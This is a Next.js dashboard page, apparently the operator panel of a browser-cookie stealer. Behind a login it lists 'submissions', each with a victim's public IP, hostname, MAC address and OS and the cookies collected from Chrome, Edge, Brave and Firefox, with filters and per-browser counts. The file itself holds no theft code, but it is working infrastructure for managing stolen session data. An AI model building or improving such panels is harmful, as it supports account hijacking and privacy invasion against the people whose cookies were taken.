"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { useSession, signOut } from "next-auth/react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { format } from "date-fns";

interface Submission {
  _id: string;
  timestamp: string;
  public_ip: string;
  device_info: {
    hostname?: string;
    mac_address?: string;
    os_system?: string;
  };
  cookies: {
    chrome?: any[];
    edge?: any[];
    brave?: any[];
    firefox?: any[];
  };
}

export default function DashboardPage() {
  const router = useRouter();
  const { data: session, status } = useSession();
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [total, setTotal] = useState(0);
  
  // Filters
  const [startDate, setStartDate] = useState("");
  const [endDate, setEndDate] = useState("");
  const [browser, setBrowser] = useState("");
  const [ipFilter, setIpFilter] = useState("");

  useEffect(() => {
    if (status === "unauthenticated") {
      router.push("/login");
    }
  }, [status, router]);

  useEffect(() => {
    if (status === "authenticated") {
      fetchSubmissions();
    }
  }, [status, page, startDate, endDate, browser, ipFilter]);

  const fetchSubmissions = async () => {
    setLoading(true);
    try {
      const params = new URLSearchParams({
        page: page.toString(),
        limit: "10",
      });

      if (startDate) params.append("startDate", startDate);
      if (endDate) params.append("endDate", endDate);
      if (browser) params.append("browser", browser);
      if (ipFilter) params.append("ip", ipFilter);

      const response = await fetch(`/api/submissions?${params}`);
      const data = await response.json();

      if (response.ok) {
        setSubmissions(data.submissions);
        setTotalPages(data.pagination.totalPages);
        setTotal(data.pagination.total);
      }
    } catch (error) {
      console.error("Failed to fetch submissions:", error);
    } finally {
      setLoading(false);
    }
  };

  const handleApplyFilters = () => {
    setPage(1);
    fetchSubmissions();
  };

  const handleClearFilters = () => {
    setStartDate("");
    setEndDate("");
    setBrowser("");
    setIpFilter("");
    setPage(1);
  };

  const getCookieCount = (cookies: Submission["cookies"]) => {
    return {
      chrome: cookies.chrome?.length || 0,
      edge: cookies.edge?.length || 0,
      brave: cookies.brave?.length || 0,
      firefox: cookies.firefox?.length || 0,
      total:
        (cookies.chrome?.length || 0) +
        (cookies.edge?.length || 0) +
        (cookies.brave?.length || 0) +
        (cookies.firefox?.length || 0),
    };
  };

  if (status === "loading" || loading) {
    return (
      <div className="flex min-h-screen items-center justify-center">
        <div className="text-lg">Loading...</div>
      </div>
    );
  }

  if (!session) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="container mx-auto p-6 space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold">Cookie Submissions Dashboard</h1>
            <p className="text-muted-foreground">
              Logged in as {session.user?.email}
            </p>
          </div>
          <Button onClick={() => signOut({ callbackUrl: "/login" })} variant="outline">
            Sign out
          </Button>
        </div>

        {/* Stats */}
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Total Submissions</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">{total}</div>
            </CardContent>
          </Card>
        </div>

        {/* Filters */}
        <Card>
          <CardHeader>
            <CardTitle>Filters</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
              <div className="space-y-2">
                <Label htmlFor="startDate">Start Date</Label>
                <Input
                  id="startDate"
                  type="datetime-local"
                  value={startDate}
                  onChange={(e) => setStartDate(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="endDate">End Date</Label>
                <Input
                  id="endDate"
                  type="datetime-local"
                  value={endDate}
                  onChange={(e) => setEndDate(e.target.value)}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="browser">Browser</Label>
                <Select value={browser || undefined} onValueChange={setBrowser}>
                  <SelectTrigger>
                    <SelectValue placeholder="All browsers" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="chrome">Chrome</SelectItem>
                    <SelectItem value="edge">Edge</SelectItem>
                    <SelectItem value="brave">Brave</SelectItem>
                    <SelectItem value="firefox">Firefox</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <Label htmlFor="ip">IP Address</Label>
                <Input
                  id="ip"
                  type="text"
                  placeholder="Search IP..."
                  value={ipFilter}
                  onChange={(e) => setIpFilter(e.target.value)}
                />
              </div>
            </div>
            <div className="flex gap-2 mt-4">
              <Button onClick={handleApplyFilters}>Apply Filters</Button>
              <Button onClick={handleClearFilters} variant="outline">
                Clear Filters
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Submissions Table */}
        <Card>
          <CardHeader>
            <CardTitle>Submissions</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="rounded-md border">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Timestamp</TableHead>
                    <TableHead>Public IP</TableHead>
                    <TableHead>Hostname</TableHead>
                    <TableHead>MAC Address</TableHead>
                    <TableHead>OS</TableHead>
                    <TableHead>Chrome</TableHead>
                    <TableHead>Edge</TableHead>
                    <TableHead>Brave</TableHead>
                    <TableHead>Firefox</TableHead>
                    <TableHead>Total</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {submissions.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={10} className="text-center">
                        No submissions found
                      </TableCell>
                    </TableRow>
                  ) : (
                    submissions.map((submission) => {
                      const cookieCount = getCookieCount(submission.cookies);
                      return (
                        <TableRow key={submission._id}>
                          <TableCell>
                            {format(new Date(submission.timestamp), "PPpp")}
                          </TableCell>
                          <TableCell>{submission.public_ip}</TableCell>
                          <TableCell>
                            {submission.device_info.hostname || "N/A"}
                          </TableCell>
                          <TableCell>
                            {submission.device_info.mac_address || "N/A"}
                          </TableCell>
                          <TableCell>
                            {submission.device_info.os_system || "N/A"}
                          </TableCell>
                          <TableCell>{cookieCount.chrome}</TableCell>
                          <TableCell>{cookieCount.edge}</TableCell>
                          <TableCell>{cookieCount.brave}</TableCell>
                          <TableCell>{cookieCount.firefox}</TableCell>
                          <TableCell className="font-medium">
                            {cookieCount.total}
                          </TableCell>
                        </TableRow>
                      );
                    })
                  )}
                </TableBody>
              </Table>
            </div>

            {/* Pagination */}
            {totalPages > 1 && (
              <div className="flex items-center justify-between mt-4">
                <div className="text-sm text-muted-foreground">
                  Page {page} of {totalPages}
                </div>
                <div className="flex gap-2">
                  <Button
                    onClick={() => setPage((p) => Math.max(1, p - 1))}
                    disabled={page === 1}
                    variant="outline"
                  >
                    Previous
                  </Button>
                  <Button
                    onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                    disabled={page === totalPages}
                    variant="outline"
                  >
                    Next
                  </Button>
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
